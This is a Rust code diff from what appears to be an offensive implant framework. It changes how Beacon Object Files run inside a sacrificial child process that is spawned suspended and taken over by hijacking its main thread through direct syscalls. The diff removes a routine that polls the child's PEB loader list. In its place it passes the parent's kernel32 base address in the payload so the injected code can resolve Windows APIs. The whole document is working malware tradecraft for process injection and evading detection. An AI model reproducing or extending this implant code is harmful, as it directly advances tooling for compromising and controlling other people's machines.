@@ -153,122 +153,16 @@ pub unsafe fn bof_isolated(blob: &[u8], args: &[String]) -> Result<Response, &'s
 
     let (mut proc, pipe_read) = unsafe { crate::inject::create_sacrificial_isolated(SPAWN_TO) }?;
     let pipe = PipeRead(pipe_read);
-    // Loader readiness gate: a CreateProcessW(SUSPENDED) child has an EMPTY
-    // LDR module list — LdrpInitializeProcess only runs on the main thread
-    // AFTER resume — so bof-host's PEB walk (export_addr) would find no
-    // kernel32 and die in exit_process's spin fallback (empirically: RIP
-    // pinned at the pause/jmp trap, child never exits). Resume the child,
-    // poll until ntdll+kernel32 are linked, then re-suspend so
-    // hijack_main_thread can set the context (loader init is <100 ms; the
-    // poll interval keeps the window before dllhost's WinMain starts).
-    unsafe {
-        nyx_implant_core::syscalls::init_global();
-        if let Some(rt) = nyx_implant_core::syscalls::global() {
-            if let Err(e) = unsafe { loader_ready(rt, &mut proc) } {
-                return Err(e);
-            }
-        } else {
-            return Err("bof isolate: syscall runtime unavailable");
-        }
-    }
+    // No loader-readiness gate: the child's Ldr module list can stay NULL
+    // in non-interactive sessions (observed on windows-latest even for a
+    // normally-running resumed child), so bof-host resolves kernel32 via
+    // the parent-provided image base (payload tail; same-boot ASLR) instead
+    // of the PEB walk — hijack directly.
     unsafe { run_in_child(&mut proc, &image, pipe.0) }
     // `proc` drops here: handles closed (fire-and-forget once resumed; the
     // never-resumed case — a pre-launch Err above — terminates the suspended
     // child via the SacrificialProcess Drop-guard). `pipe` drops here too:
     // the read handle is closed on every path, success or Err.
-}
-
-/// Resume the suspended child so the loader initializes the LDR module list,
-/// poll until at least ntdll+kernel32 are linked (bof-host's PEB walk
-/// requirement), then suspend the main thread again for the context hijack.
-unsafe fn loader_ready(
-    rt: &nyx_implant_core::syscalls::Runtime,
-    proc: &mut crate::inject::SacrificialProcess,
-) -> Result<(), &'static str> {
-    use nyx_implant_core::syscalls as sc;
-    let mut prev: u32 = 0;
-    let st = unsafe { sc::nt_resume_thread(rt, proc.main_thread as usize, &mut prev) };
-    if st.is_none() || st.unwrap() < 0 {
-        return Err("bof isolate: loader resume failed");
-    }
-    // PROCESS_BASIC_INFORMATION (class 0): PebBaseAddress at offset 8 (x64).
-    let mut pbi = [0u8; 48];
-    let mut ret_len: u32 = 0;
-    let st = unsafe {
-        sc::nt_query_information_process(
-            rt,
-            proc.handle as usize,
-            0,
-            pbi.as_mut_ptr(),
-            48,
-            &mut ret_len,
-        )
-    };
-    if st.is_none() || st.unwrap() < 0 {
-        return Err("bof isolate: process info failed");
-    }
-    let peb = u64::from_le_bytes(pbi[8..16].try_into().unwrap());
-    if peb == 0 {
-        return Err("bof isolate: child has no PEB");
-    }
-    let mut ready = false;
-    // Budget 20 s: on some hosts (non-interactive Session 0) the loader
-    // takes several seconds to link the first modules after resume
-    // (observed: Ldr stays 0 for >5 s on windows-latest while a plain
-    // resumed cmd.exe still finishes within 15 s).
-    for _ in 0..1000 {
-        // LDR_DATA: InLoadOrderModuleList at offset 0x10; entries link via
-        // LDR_DATA_TABLE_ENTRY.InLoadOrderLinks.flink (offset 0x8). Only
-        // this chain is what bof-host's resolve walks — InMemoryOrder
-        // (+0x10) can look ready while InLoadOrder is still just the main
-        // module (observed under wine with dllhost.exe).
-        let ldr = unsafe { read_child_u64(rt, proc, peb + 0x18) };
-        if ldr != 0 {
-            let head = ldr + 0x10;
-            let mut flink = unsafe { read_child_u64(rt, proc, head) };
-            let mut count: u32 = 0;
-            while flink != 0 && flink != head && count < 32 {
-                count += 1;
-                flink = unsafe { read_child_u64(rt, proc, flink + 0x8) };
-            }
-            if count >= 2 {
-                ready = true;
-                break;
-            }
-        }
-        unsafe { sc::nt_delay_execution(rt, 0, 20_000) };
-    }
-    if !ready {
-        return Err("bof isolate: child loader not ready");
-    }
-    let st = unsafe { sc::nt_suspend_thread(rt, proc.main_thread as usize, &mut prev) };
-    if st.is_none() || st.unwrap() < 0 {
-        return Err("bof isolate: re-suspend failed");
-    }
-    Ok(())
-}
-
-/// Cross-process u64 read (NtReadVirtualMemory); 0 on failure.
-unsafe fn read_child_u64(
-    rt: &nyx_implant_core::syscalls::Runtime,
-    proc: &crate::inject::SacrificialProcess,
-    addr: u64,
-) -> u64 {
-    let mut v: u64 = 0;
-    let st = unsafe {
-        nyx_implant_core::syscalls::nt_read_virtual_memory(
-            rt,
-            proc.handle as usize,
-            addr as usize,
-            (&mut v as *mut u64) as *mut u8,
-            8,
-        )
-    };
-    if st.is_some() && st.unwrap() >= 0 {
-        v
-    } else {
-        0
-    }
 }
 
 /// Post-spawn half: deliver → hijack → reclaim. Kept separate so every
@@ -295,11 +189,18 @@ unsafe fn run_in_child(
 /// ([`crate::bof::pack_args`] — verbatim reuse).
 fn pack_payload(blob: &[u8], args: &[String]) -> Vec<u8> {
     let packed_args = crate::bof::pack_args(args);
-    let mut out = Vec::with_capacity(8 + blob.len() + packed_args.len());
+    // The parent's kernel32 base, appended after the args: the sacrificial
+    // child shares image bases (boot-level ASLR) and its own Ldr list can be
+    // null (suspended+resumed child), so bof-host falls back to this when
+    // its PEB walk finds nothing (see bof-host lib.rs export_addr).
+    let k32 = unsafe { nyx_implant_core::resolve::module_base_by_name(b"kernel32.dll") }
+        .unwrap_or(core::ptr::null_mut()) as u64;
+    let mut out = Vec::with_capacity(8 + blob.len() + packed_args.len() + 8);
     out.extend_from_slice(&(blob.len() as u32).to_le_bytes());
     out.extend_from_slice(blob);
     out.extend_from_slice(&(packed_args.len() as u32).to_le_bytes());
     out.extend_from_slice(&packed_args);
+    out.extend_from_slice(&k32.to_le_bytes());
     out
 }
 
